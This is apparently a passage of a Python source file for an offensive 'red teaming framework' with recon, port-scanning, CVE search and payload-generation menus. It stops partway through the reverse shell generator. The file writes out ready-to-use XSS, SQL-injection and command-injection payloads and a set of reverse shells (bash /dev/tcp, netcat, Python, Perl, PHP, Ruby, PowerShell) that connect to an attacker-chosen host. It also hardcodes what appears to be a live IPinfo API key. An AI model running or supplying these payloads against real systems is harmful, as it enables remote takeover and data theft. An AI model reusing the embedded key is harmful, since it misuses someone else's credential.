import os
import sys
import time
import requests
import json
import socket
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich.columns import Columns
from rich.text import Text
from rich.live import Live
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
from urllib.parse import urlparse, urljoin
import ipaddress

try:
    import whois
except ImportError:
    print("Error: 'python-whois' library not found. Please install it using: pip install python-whois")
    sys.exit(1)

try:
    from ipwhois import IPWhois
except ImportError:
    print("Error: 'ipwhois' library not found. Please install it using: pip install ipwhois")
    sys.exit(1)

try:
    import ipinfo
except ImportError:
    print("Error: 'ipinfo' library not found. Please install it using: pip install ipinfo")
    sys.exit(1)

try:
    import nmap
except ImportError:
    print("Error: 'python-nmap' library not found. Please install it using: pip install python-nmap")
    print("Note: Nmap must also be installed on your system for this library to work.")
    pass

try:
    from bs4 import BeautifulSoup, Comment
except ImportError:
    print("Error: 'BeautifulSoup4' library not found. Please install it using: pip install beautifulsoup4")
    sys.exit(1)

try:
    import nvdlib
except ImportError:
    print("Error: 'nvdlib' library not found. Please install it using: pip install nvdlib")
    pass

try:
    from scapy.all import IP, TCP, UDP, ICMP, sr1, send, sniff, ARP, Ether, DNS, DNSQR, DNSRR, RandShort
except ImportError:
    print("Error: 'scapy' library not found. Please install it using: pip install scapy")
    pass

import http.server
import socketserver
import threading
from functools import partial

console = Console()

IPINFO_API_KEY = '537b2cb8198661'
NVD_API_KEY = 'YOUR_NVD_API_KEY'

phishing_server_thread = None
httpd_phishing = None

MODULES_CONFIG = [
    {'name': 'Reconnaissance', 'func_name': 'run_reconnaissance'},
    {'name': 'Intelligence Gathering', 'func_name': 'run_intelligence_gathering'},
    {'name': 'Exploit Arsenal', 'func_name': 'run_exploit_arsenal'},
    {'name': 'Offensive Operations', 'func_name': 'run_offensive_operations'},
    {'name': 'Directory Scanner', 'func_name': 'run_directory_scanner'},
    {'name': 'API Spammer', 'func_name': 'run_api_spammer'},
    {'name': 'POST Requester', 'func_name': 'run_post_requester'},
    {'name': 'Custom Payload Executor', 'func_name': 'run_payload_executor'},
    {'name': 'C2 Communication', 'func_name': 'run_c2_communication'},
    {'name': 'Exit Framework', 'func_name': 'exit_framework'}
]

WORDLIST_PATH = 'data/wordlists/common.txt'
BACKEND_PATHS = [
    'admin', 'administrator', 'login', 'wp-admin', 'wp-login.php', 'config',
    'backup', 'api', 'dashboard', 'uploads', 'assets', 'includes', 'tmp',
    'temp', 'logs', 'database', 'secret', '.env', '.git', 'vendor', 'phpmyadmin',
    'test', 'dev', 'prod', 'staging', 'webadmin', 'controlpanel', 'cpanel',
    'manage', 'user', 'users', 'moderator', 'root', 'private', 'conf', 'settings',
    'xmlrpc.php', 'swagger', 'swagger-ui.html', 'api-docs'
]
DEFAULT_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
INTERESTING_STATUS_CODES = {
    200: "[green]OK[/green]",
    301: "[yellow]Moved Permanently[/yellow]",
    302: "[yellow]Found (Moved Temporarily)[/yellow]",
    401: "[magenta]Unauthorized[/magenta]",
    403: "[red]Forbidden[/red]",
    500: "[orange_red1]Internal Server Error[/orange_red1]"
}

NEW_BANNER_ASCII = r"""
██████╗ ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔══██╗██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
██║  ██║█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
██║  ██║██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
██████╔╝███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                                             """
FROG_HEAD_ASCII = r"""
                              .-----.
                              /7  .  (
                             /   .-.  \
                            /   /   \  \
                           / `  )   (   )
                          / `   )   ).  \
                        .'  _.   \_/  . |
       .--.           .' _.' )`.        |
      (    `---...._.'   `---.'_)    ..  \
       \            `----....___    `. \  |
        `.           _ ----- _   `._  )/  |
          `.       /"  \   /"  \`.  `._   |
            `.    ((O)` ) ((O)` ) `.   `._\
              `-- '`---'   `---' )  `.    `-.
                 /                  ` \      `-.
               .'                      `.       `.
              /                     `  ` `.       `-.
       .--.   \ ===._____.======. `    `   `. .___.--`
"""

def force_clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def validate_url(url: str, ensure_scheme=True) -> bool:
    try:
        result = urlparse(url)
        if ensure_scheme:
            return all([result.scheme, result.netloc]) and result.scheme in ['http', 'https']
        return all([result.netloc])
    except ValueError: return False

def validate_ip(ip_str: str) -> bool:
    try:
        ipaddress.ip_address(ip_str)
        return True
    except ValueError:
        return False

def leave_module_prompt(is_submenu=False):
    console.print("")
    menu_name = "previous menu" if is_submenu else "main menu"
    Prompt.ask(f"[cyan]Press [bold]0[/bold] to return to the {menu_name}[/cyan]", choices=["0"], default="0")

def parse_json_input(json_string: str, default_if_empty=None):
    if not json_string.strip():
        return default_if_empty if default_if_empty is not None else {}
    try: return json.loads(json_string)
    except json.JSONDecodeError as e:
        console.print(f"[red]Invalid JSON format: {e}. Using empty object.[/red]")
        return {}

def confirm_ethical_use(feature_name: str) -> bool:
    console.print(Panel(
        Text.assemble(
            (f"Warning: The '{feature_name}' feature can be misused.\n", "bold yellow"),
            ("Ensure you have EXPLICIT, WRITTEN PERMISSION before using it on any system or network you do not own.\n", "yellow"),
            ("Misuse can lead to severe legal consequences. Use responsibly and ethically.", "yellow")
        ),
        title="[bold red]Ethical Use Agreement[/bold red]",
        border_style="red",
        padding=(1,2)
    ))
    return Confirm.ask(f"Do you understand and agree to use '{feature_name}' ethically and legally?", default=False)

def get_banner_panel() -> Panel:
    banner_lines_raw = NEW_BANNER_ASCII.splitlines()
    styled_banner_text = Text()
    colors = ["bold #0033A0", "bold #0055CC", "bold #3385FF", "bold #66A3FF", "bold #99C2FF", "bold #CCDEFF"]
    for i, line in enumerate(banner_lines_raw):
        if i < 6:
            styled_banner_text.append(line + "\n", style=colors[i])
    return Panel(styled_banner_text, title="[bold #00BFFF]Automated Red Teaming Framework[/bold #00BFFF]", border_style="bold #0077CC", padding=(1, 1))

def main_menu():
    force_clear_screen()
    console.print(get_banner_panel())
    console.print(Text("Coded by Dex", style="bold red", justify="center"))
    console.print("\n")
    menu_table = Table(title="[bold #66D9EF]Main Menu[/bold #66D9EF]", border_style="#0077CC", show_header=True, header_style="bold #00BFFF")
    menu_table.add_column("No.", style="dim #FFFFFF", width=5, justify="center")
    menu_table.add_column("Module", style="#E6E6FA")
    for idx, mod_config in enumerate(MODULES_CONFIG): menu_table.add_row(str(idx + 1), mod_config['name'])
    frog_panel = Panel(FROG_HEAD_ASCII, title="[#32CD32]Froggy[/]", border_style="#32CD32", width=50)
    menu_content_columns = Columns([menu_table, frog_panel], padding=1, expand=True)
    console.print(menu_content_columns)
    console.print("\n")
    choice_str = Prompt.ask("[bold #FFD700]Select a module (number)[/bold #FFD700]", choices=[str(i) for i in range(1, len(MODULES_CONFIG) + 1)], default="1")
    return int(choice_str)

def run_reconnaissance():
    force_clear_screen()
    console.print(Panel("[bold #40E0D0]Reconnaissance[/bold #40E0D0]",padding=1, border_style="#40E0D0"))
    recon_options = {"1": "DNS Lookup", "2": "Fetch HTTP Headers", "0": "Back to Main Menu"}
    while True:
        console.print("\n[cyan]Reconnaissance Options:[/cyan]")
        options_table = Table(show_header=True, header_style="bold magenta", border_style="dim")
        options_table.add_column("No.", style="dim", width=5, justify="center")
        options_table.add_column("Action")
        for key, value in recon_options.items(): options_table.add_row(key, value)
        console.print(options_table)
        choice = Prompt.ask("Select an option (number)", choices=list(recon_options.keys()), default="0")
        if choice == "0": break
        force_clear_screen()
        console.print(Panel(f"[bold #40E0D0]Reconnaissance: {recon_options[choice]}[/bold #40E0D0]",padding=1, border_style="#40E0D0"))
        if choice == "1":
            hostname_input = Prompt.ask("[#FFFF00]Enter hostname (e.g., example.com)[/#FFFF00]")
            parsed_url = urlparse(hostname_input)
            hostname_to_lookup = parsed_url.netloc if parsed_url.netloc else hostname_input
            if not hostname_to_lookup: console.print("[red]Invalid hostname or URL.[/red]")
            else:
                try:
                    console.print(f"\n[cyan]DNS Information for: {hostname_to_lookup}[/cyan]")
                    ainfo = socket.getaddrinfo(hostname_to_lookup, None); ips = set()
                    dns_results_table = Table(title="DNS Lookup Results", border_style="green")
                    dns_results_table.add_column("IP Address", style="cyan"); dns_results_table.add_column("Family", style="magenta")
                    for res in ainfo:
                        ip_addr = res[4][0]
                        if ip_addr not in ips: ips.add(ip_addr); dns_results_table.add_row(ip_addr, str(res[0].name))
                    if ips: console.print(dns_results_table)
                    else: console.print(f"[yellow]No IP addresses found for {hostname_to_lookup}.[/yellow]")
                except socket.gaierror as e: console.print(f"[red]DNS resolution error for {hostname_to_lookup}: {e}[/red]")
        elif choice == "2":
            url = Prompt.ask("[#FFFF00]Enter URL (e.g., http://example.com)[/#FFFF00]")
            if not validate_url(url): console.print("[red]Invalid URL.[/red]")
            else:
                try:
                    console.print(f"\n[cyan]Fetching HTTP(S) Headers for: {url}[/cyan]")
                    response = requests.get(url, headers={'User-Agent': DEFAULT_USER_AGENT}, timeout=10, allow_redirects=True)
                    headers_table = Table(title=f"HTTP Headers for {url} (Status: {response.status_code})", border_style="green")
                    headers_table.add_column("Header", style="cyan", overflow="fold"); headers_table.add_column("Value", style="magenta", overflow="fold")
                    for key, value in response.headers.items(): headers_table.add_row(key, value)
                    console.print(headers_table)
                except requests.RequestException as e: console.print(f"[red]Error fetching headers: {e}[/red]")
        Prompt.ask("\n[cyan]Press Enter to return to Reconnaissance options...[/cyan]", default="")
        force_clear_screen()
        console.print(Panel("[bold #40E0D0]Reconnaissance[/bold #40E0D0]",padding=1, border_style="#40E0D0"))

def run_intelligence_gathering():
    force_clear_screen()
    console.print(Panel("[bold #FFA500]Intelligence Gathering[/bold #FFA500]", padding=1, border_style="#FFA500"))
    intel_options = {
        "1": "URL Analysis",
        "2": "IP Address Analysis",
        "0": "Back to Main Menu"
    }
    while True:
        console.print("\n[cyan]Intelligence Gathering Options:[/cyan]")
        options_table = Table(show_header=True, header_style="bold #FFA500", border_style="dim")
        options_table.add_column("No.", style="dim", width=5, justify="center")
        options_table.add_column("Action")
        for key, value in intel_options.items(): options_table.add_row(key, value)
        console.print(options_table)
        choice = Prompt.ask("Select an option (number)", choices=list(intel_options.keys()), default="0")

        if choice == "0": break
        force_clear_screen()
        console.print(Panel(f"[bold #FFA500]Intelligence Gathering: {intel_options[choice]}[/bold #FFA500]", padding=1, border_style="#FFA500"))

        if choice == "1": run_url_analysis_suite()
        elif choice == "2": run_ip_analysis_suite()

        if choice != "0":
            Prompt.ask("\n[cyan]Press Enter to return to Intelligence Gathering options...[/cyan]", default="")
            force_clear_screen()
            console.print(Panel("[bold #FFA500]Intelligence Gathering[/bold #FFA500]", padding=1, border_style="#FFA500"))

def run_url_analysis_suite():
    url_analysis_options = {
        "1": "Domain WHOIS Lookup",
        "2": "Basic Page Source Analysis",
        "0": "Back to Intelligence Gathering Menu"
    }
    while True:
        console.print("\n[cyan]URL Analysis Suite:[/cyan]")
        options_table = Table(show_header=True, header_style="bold #FFC0CB", border_style="dim")
        options_table.add_column("No.", style="dim", width=5, justify="center")
        options_table.add_column("Action")
        for key, value in url_analysis_options.items(): options_table.add_row(key, value)
        console.print(options_table)
        choice = Prompt.ask("Select URL analysis option", choices=list(url_analysis_options.keys()), default="0")

        if choice == "0": break
        target_url_raw = Prompt.ask("[#FFFF00]Enter target URL (e.g., http://example.com) or domain (e.g., example.com)[/#FFFF00]")
        parsed_target = urlparse(target_url_raw)
        target_domain = parsed_target.netloc if parsed_target.netloc else target_url_raw
        target_url_full = target_url_raw if parsed_target.scheme else f"http://{target_url_raw}"
        if not target_domain: console.print("[red]Invalid URL or domain provided.[/red]"); continue

        if choice == "1":
            try:
                console.print(f"\n[cyan]Fetching WHOIS for domain: {target_domain}[/cyan]")
                domain_info = whois.whois(target_domain)
                if domain_info and (domain_info.get('domain_name') or domain_info.get('emails') or domain_info.get('name_servers')):
                    info_table = Table(title=f"WHOIS Information for {target_domain}", border_style="green")
                    info_table.add_column("Field", style="cyan"); info_table.add_column("Value", style="magenta", overflow="fold")
                    for key, value in domain_info.items():
                        if value:
                            if isinstance(value, list): info_table.add_row(str(key), "\n".join(map(str, value)))
                            else: info_table.add_row(str(key), str(value))
                    console.print(info_table)
                else:
                    console.print(f"[yellow]WHOIS information for '{target_domain}' might be incomplete, domain not registered, or access denied.[/yellow]")
                    if domain_info and domain_info.text: console.print(Panel(domain_info.text, title="Raw WHOIS Data", border_style="yellow", expand=False))
            except Exception as e: console.print(f"[red]Error during WHOIS lookup for {target_domain}: {e}[/red]")
        elif choice == "2":
            if not validate_url(target_url_full): console.print(f"[red]Invalid URL for page source analysis: {target_url_full}.[/red]"); continue
            try:
                console.print(f"\n[cyan]Fetching page source for: {target_url_full}[/cyan]")
                response = requests.get(target_url_full, headers={'User-Agent': DEFAULT_USER_AGENT}, timeout=15, allow_redirects=True)
                response.raise_for_status()
                soup = BeautifulSoup(response.text, 'html.parser')
                analysis_table = Table(title=f"Basic Page Analysis for {target_url_full}", border_style="green")
                analysis_table.add_column("Element Type", style="cyan"); analysis_table.add_column("Details (First 5 or unique)", style="magenta", overflow="fold")
                scripts = soup.find_all('script'); script_srcs = list(set([s.get('src') for s in scripts if s.get('src')]))[:5]; inline_scripts_count = len([s for s in scripts if not s.get('src')])
                analysis_table.add_row("Script Tags", f"Total: {len(scripts)}\nExternal (first 5 unique): {script_srcs if script_srcs else 'None'}\nInline: {inline_scripts_count}")
                links = soup.find_all('a', href=True); external_links = list(set([l['href'] for l in links if l['href'].startswith('http') and urlparse(l['href']).netloc != target_domain]))[:5]
                analysis_table.add_row("External Links", f"Total unique showing: {len(external_links)}\n{external_links if external_links else 'None'}")
                iframes = soup.find_all('iframe'); iframe_srcs = list(set([i.get('src') for i in iframes if i.get('src')]))[:5]
                analysis_table.add_row("IFrames", f"Total: {len(iframes)}\nSources (first 5 unique): {iframe_srcs if iframe_srcs else 'None'}")
                comments = soup.find_all(string=lambda text: isinstance(text, Comment)); comment_content = [c.strip() for c in comments][:5]
                analysis_table.add_row("HTML Comments", f"Total: {len(comments)}\nContent (first 5):\n{comment_content if comment_content else 'None'}")
                console.print(analysis_table)
            except requests.RequestException as e: console.print(f"[red]Error fetching page {target_url_full}: {e}[/red]")
            except Exception as e: console.print(f"[red]Error analyzing page source for {target_url_full}: {e}[/red]")
        Prompt.ask("\n[cyan]Press Enter to return to URL Analysis options...[/cyan]", default="")
        force_clear_screen(); console.print(Panel(f"[bold #FFA500]Intelligence Gathering: URL Analysis[/bold #FFA500]", padding=1, border_style="#FFA500"))

def run_ip_analysis_suite():
    ip_analysis_options = {
        "1": "IP WHOIS Lookup",
        "2": "IP Geolocation",
        "3": "Port Scan",
        "4": "OS Fingerprinting (Requires Nmap & Privileges)",
        "0": "Back to Intelligence Gathering Menu"
    }
    while True:
        console.print("\n[cyan]IP Address Analysis Suite:[/cyan]")
        options_table = Table(show_header=True, header_style="bold #ADD8E6", border_style="dim")
        options_table.add_column("No.", style="dim", width=5, justify="center")
        options_table.add_column("Action")
        for key, value in ip_analysis_options.items(): options_table.add_row(key, value)
        console.print(options_table)
        choice = Prompt.ask("Select IP analysis option", choices=list(ip_analysis_options.keys()), default="0")

        if choice == "0": break
        target_ip = Prompt.ask("[#FFFF00]Enter target IP Address[/#FFFF00]")
        if not validate_ip(target_ip):
            console.print("[red]Invalid IP address format.[/red]")
            continue

        if choice == "1":
            try:
                console.print(f"\n[cyan]Fetching WHOIS for IP: {target_ip}[/cyan]")
                obj = IPWhois(target_ip); results = obj.lookup_rdap(depth=1)
                info_table = Table(title=f"IP WHOIS Information for {target_ip}", border_style="green")
                info_table.add_column("Field", style="cyan"); info_table.add_column("Value", style="magenta", overflow="fold")
                if results.get('asn_description'): info_table.add_row("ASN Description", str(results['asn_description']))
                if results.get('asn_cidr'): info_table.add_row("ASN CIDR", str(results['asn_cidr']))
                if results.get('network'):
                    net = results['network']
                    info_table.add_row("Network Name", str(net.get('name'))); info_table.add_row("Network CIDR", str(net.get('cidr')))
                if results.get('objects'):
                    for obj_name, obj_data in results['objects'].items():
                        contact_name = obj_data.get('contact', {}).get('name', 'N/A'); role = obj_data.get('roles', ['N/A'])[0]
                        info_table.add_row(f"Object: {obj_name} ({role})", f"Name: {contact_name}")
                if not info_table.rows: console.print(f"[yellow]No detailed WHOIS data found for {target_ip}. Raw:\n{json.dumps(results, indent=2)}[/yellow]")
                else: console.print(info_table)
            except Exception as e: console.print(f"[red]Error during IP WHOIS lookup for {target_ip}: {e}[/red]")

        elif choice == "2":
            if IPINFO_API_KEY == 'YOUR_IPINFO_API_KEY' or not IPINFO_API_KEY:
                console.print("[red]IPinfo API key not configured or still default. Please set IPINFO_API_KEY.[/red]"); continue
            try:
                console.print(f"\n[cyan]Fetching Geolocation for IP: {target_ip}[/cyan]")
                handler = ipinfo.getHandler(IPINFO_API_KEY); details = handler.getDetails(target_ip)
                geo_table = Table(title=f"Geolocation for {target_ip}", border_style="green")
                geo_table.add_column("Field", style="cyan"); geo_table.add_column("Value", style="magenta")
                for field, value in details.all.items(): geo_table.add_row(str(field).capitalize(), str(value))
                console.print(geo_table)
            except Exception as e: console.print(f"[red]Error fetching geolocation for {target_ip}: {e}[/red]")

        elif choice == "3":
            try: nm_scanner = nmap.PortScanner()
            except nmap.PortScannerError: console.print("[red]Nmap not found. Please install Nmap and ensure it's in PATH.[/red]"); continue
            ports_to_scan = Prompt.ask("[#FFFF00]Enter ports (e.g., 21-23,80,443 or 'top20')[/#FFFF00]", default="top20")
            scan_arguments = '-sV -Pn'
            if ports_to_scan.lower() == "top20":
                ports_to_scan_list = "21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080"
            else:
                ports_to_scan_list = ports_to_scan

            console.print(f"\n[cyan]Starting Nmap scan on {target_ip} for ports: {ports_to_scan_list}...[/cyan]")
            try:
                nm_scanner.scan(target_ip, ports_to_scan_list, arguments=scan_arguments)
                if target_ip not in nm_scanner.all_hosts(): console.print(f"[yellow]Host {target_ip} unresponsive.[/yellow]")
                else:
                    results_table = Table(title=f"Open Ports on {target_ip}", border_style="green")
                    results_table.add_column("Port", style="cyan"); results_table.add_column("State", style="magenta")
                    results_table.add_column("Service", style="yellow"); results_table.add_column("Version", style="blue", overflow="fold")
                    found_open = False
                    for proto in nm_scanner[target_ip].all_protocols():
                        lport = nm_scanner[target_ip][proto].keys()
                        for port in sorted(lport):
                            state = nm_scanner[target_ip][proto][port]['state']
                            if state == 'open':
                                found_open = True
                                service = nm_scanner[target_ip][proto][port]['name']
                                version = f"{nm_scanner[target_ip][proto][port]['product']} {nm_scanner[target_ip][proto][port]['version']}".strip()
                                results_table.add_row(str(port), state, service, version)
                    if found_open: console.print(results_table)
                    else: console.print(f"[yellow]No open ports found on {target_ip} for the specified range.[/yellow]")
            except Exception as e: console.print(f"[red]Error during port scan for {target_ip}: {e}[/red]")

        elif choice == "4":
            try: nm_scanner = nmap.PortScanner()
            except nmap.PortScannerError: console.print("[red]Nmap not found. Please install Nmap and ensure it's in PATH.[/red]"); continue
            console.print(f"\n[cyan]Starting OS fingerprinting on {target_ip} (may require privileges & open/closed TCP port)...[/cyan]")
            try:
                nm_scanner.scan(target_ip, arguments='-O -Pn')
                if target_ip in nm_scanner.all_hosts() and 'osmatch' in nm_scanner[target_ip] and nm_scanner[target_ip]['osmatch']:
                    os_table = Table(title=f"OS Fingerprinting: {target_ip}", border_style="green")
                    os_table.add_column("OS Name", style="cyan"); os_table.add_column("Accuracy", style="magenta")
                    os_table.add_column("Vendor", style="yellow"); os_table.add_column("Family", style="blue")
                    for match in nm_scanner[target_ip]['osmatch']:
                        os_class = match.get('osclass', [{}])[0]
                        os_table.add_row(match['name'], f"{match['accuracy']}%", os_class.get('vendor', 'N/A'), os_class.get('osfamily', 'N/A'))
                    console.print(os_table)
                elif target_ip in nm_scanner.all_hosts(): console.print(f"[yellow]Could not determine OS for {target_ip}. Nmap might need specific ports open/closed or different options.[/yellow]")
                else: console.print(f"[yellow]Host {target_ip} unresponsive to OS scan.[/yellow]")
            except Exception as e: console.print(f"[red]Error during OS fingerprinting for {target_ip}: {e}[/red]")

        Prompt.ask("\n[cyan]Press Enter to return to IP Analysis options...[/cyan]", default="")
        force_clear_screen(); console.print(Panel(f"[bold #FFA500]Intelligence Gathering: IP Address Analysis[/bold #FFA500]", padding=1, border_style="#FFA500"))

def run_exploit_arsenal():
    force_clear_screen()
    console.print(Panel("[bold #FF4500]Exploit Arsenal[/bold #FF4500]", padding=1, border_style="#FF4500"))
    exploit_options = {
        "1": "CVE Search (NVD)",
        "2": "Simple Payload Generator",
        "3": "Reverse Shell Generator",
        "0": "Back to Main Menu"
    }
    while True:
        console.print("\n[cyan]Exploit Arsenal Options:[/cyan]")
        options_table = Table(show_header=True, header_style="bold #FF4500", border_style="dim")
        options_table.add_column("No.", style="dim", width=5, justify="center")
        options_table.add_column("Action")
        for key, value in exploit_options.items(): options_table.add_row(key, value)
        console.print(options_table)
        choice = Prompt.ask("Select an option", choices=list(exploit_options.keys()), default="0")

        if choice == "0": break
        force_clear_screen()
        console.print(Panel(f"[bold #FF4500]Exploit Arsenal: {exploit_options[choice]}[/bold #FF4500]", padding=1, border_style="#FF4500"))

        if choice == "1": search_cves_nvd()
        elif choice == "2": generate_simple_payloads()
        elif choice == "3": generate_reverse_shell_payloads()

        if choice != "0":
            Prompt.ask("\n[cyan]Press Enter to return to Exploit Arsenal options...[/cyan]", default="")
            force_clear_screen()
            console.print(Panel("[bold #FF4500]Exploit Arsenal[/bold #FF4500]", padding=1, border_style="#FF4500"))

def search_cves_nvd():
    console.print(Panel("[bold cyan]CVE Search (NIST NVD)[/bold cyan]", border_style="cyan"))
    nvd_api_key_to_use = NVD_API_KEY
    if NVD_API_KEY == 'YOUR_NVD_API_KEY' or not NVD_API_KEY:
        console.print("[yellow]NVD API Key is not set or is default. Searches will be significantly rate-limited by NIST.[/yellow]")
        console.print("[yellow]Get a key from: https://nvd.nist.gov/developers/request-an-api-key and set NVD_API_KEY.[/yellow]")
        if not Confirm.ask("Continue with potentially slow, rate-limited search?", default=False):
            return
        nvd_api_key_to_use = None

    search_type = Prompt.ask("Search by:", choices=["cve_id", "keyword", "cpe"], default="keyword")
    query_params = {}
    search_term = "N/A"

    if search_type == "cve_id":
        search_term = Prompt.ask("Enter CVE ID (e.g., CVE-2021-44228)")
        query_params['cveId'] = search_term
    elif search_type == "keyword":
        search_term = Prompt.ask("Enter keyword(s)")
        query_params['keywordSearch'] = search_term
        query_params['keywordExactMatch'] = Confirm.ask("Exact match for all keywords?", default=False)
    elif search_type == "cpe":
        search_term = Prompt.ask("Enter CPE name (e.g., cpe:2.3:a:apache:log4j:2.0:-:*:*:*:*:*:*)")
        query_params['cpeName'] = search_term
    
    try:
        results_per_page_str = Prompt.ask("Results per page", default="20")
        results_per_page = int(results_per_page_str)
        if results_per_page <= 0: results_per_page = 20
    except ValueError:
        results_per_page = 20
        console.print(f"[yellow]Invalid number for results per page, defaulting to {results_per_page}.[/yellow]")
        
    query_params['resultsPerPage'] = results_per_page

    try:
        console.print(f"\n[cyan]Searching NVD for '{search_term}'...[/cyan]")
        if 'nvdlib' not in sys.modules:
            console.print("[red]nvdlib library is not loaded. Cannot perform CVE search.[/red]"); return

        results = nvdlib.searchCVE(**query_params, key=nvd_api_key_to_use)

        if not results:
            console.print(f"[yellow]No CVEs found for your criteria.[/yellow]")
            return

        cve_table = Table(title=f"CVE Search Results", border_style="green", show_lines=True)
        cve_table.add_column("CVE ID", style="cyan", no_wrap=True)
        cve_table.add_column("Description", style="magenta")
        cve_table.add_column("Severity (CVSS v3.x)", style="yellow", width=15)
        cve_table.add_column("Published", style="blue", width=12)
        cve_table.add_column("References", style="dim", overflow="fold")

        for cve in results:
            description = "N/A"
            if cve.descriptions:
                description = next((d.value for d in cve.descriptions if d.lang == 'en'), cve.descriptions[0].value)

            severity_str = "N/A"
            cvss_metrics = None
            if hasattr(cve, 'metrics') and cve.metrics:
                if 'cvssMetricV31' in cve.metrics and cve.metrics.cvssMetricV31:
                    cvss_metrics = cve.metrics.cvssMetricV31[0].cvssData
                elif 'cvssMetricV30' in cve.metrics and cve.metrics.cvssMetricV30:
                    cvss_metrics = cve.metrics.cvssMetricV30[0].cvssData
            if cvss_metrics:
                severity_str = f"{cvss_metrics.baseSeverity} ({cvss_metrics.baseScore})"

            refs_str = ""
            if cve.references:
                refs_str = "\n".join([ref.url for ref in cve.references[:3]])
                if len(cve.references) > 3: refs_str += "\n..."

            cve_table.add_row(
                Text(cve.id, style=f"link https://nvd.nist.gov/vuln/detail/{cve.id}"),
                description, severity_str,
                cve.published.split('T')[0] if cve.published else "N/A",
                refs_str
            )
        console.print(cve_table)

    except Exception as e:
        console.print(f"[red]Error during CVE search: {e}[/red]")
        console.print_exception(max_frames=1)

def generate_simple_payloads():
    console.print(Panel("[bold cyan]Simple Payload Generator[/bold cyan]", border_style="cyan"))
    payload_type = Prompt.ask("Select payload type:", choices=["xss", "sqli", "cmd_injection"], default="xss")

    payloads_table = Table(title=f"Generated {payload_type.upper()} Payloads", border_style="green")
    payloads_table.add_column("Payload", style="magenta", overflow="fold")

    if payload_type == "xss":
        common_xss = [
            "<script>alert('XSS')</script>", "<img src=x onerror=alert(document.cookie)>",
            "<svg/onload=alert(1)>", "javascript:alert('XSS')",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>", "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
        ]
        for p in common_xss: payloads_table.add_row(p)
    elif payload_type == "sqli":
        target_param = Prompt.ask("Enter example parameter value (e.g., 1, 'admin')", default="1")
        common_sqli = [
            f"{target_param}' OR '1'='1", f"{target_param}\" OR \"1\"=\"1",
            f"{target_param}' OR 'a'='a' -- ", f"{target_param}' OR 1=1 -- ",
            f"{target_param}' UNION SELECT NULL, @@version -- ",
            f"{target_param}' UNION SELECT NULL, NULL, database() -- ",
            f"1 OR SLEEP(5)#", f"' OR SLEEP(5)#", f"admin'--", f"admin' #", f"admin'/*"
        ]
        for p in common_sqli: payloads_table.add_row(p)
    elif payload_type == "cmd_injection":
        cmd_to_inject = Prompt.ask("Enter command to inject (e.g., id, ls -la, whoami)", default="id")
        separators = [";", "|", "&&", "`", "$(", "\n"]
        common_cmd = []
        for sep in separators:
            common_cmd.append(f"{sep} {cmd_to_inject}")
            common_cmd.append(f"target_command_placeholder {sep} {cmd_to_inject}")
        for p in common_cmd: payloads_table.add_row(p)
    console.print(payloads_table)

def generate_reverse_shell_payloads():
    console.print(Panel("[bold cyan]Reverse Shell Generator[/bold cyan]", border_style="cyan"))
    lhost = Prompt.ask("Enter Your Listening IP (LHOST)", default="10.0.0.1")
    lport = Prompt.ask("Enter Your Listening Port (LPORT)", default="4444")
    if not validate_ip(lhost): console.print("[red]Invalid LHOST IP format.[/red]"); return
    if not lport.isdigit() or not (0 < int(lport) < 65536) : console.print("[red]Invalid LPORT.[/red]"); return

    shells = {
        "bash_tcp": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "bash_udp": f"sh -i >& /dev/udp/{lhost}/{lport} 0>&1",
        "nc_mkfifo": f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "nc_exe": f"nc -e /bin/sh {lhost} {lport}",
        "python3_tcp": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{int(lport)}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "python_tcp_pty": f"python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{int(lport)}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
        "perl_tcp": rf"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "php_tcp": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "ruby_tcp": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "powershell_tcp": f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    }
    shell_table = Table(title=f"Reverse Shell Payloads for {lhost}:{lport}", border_style="green")
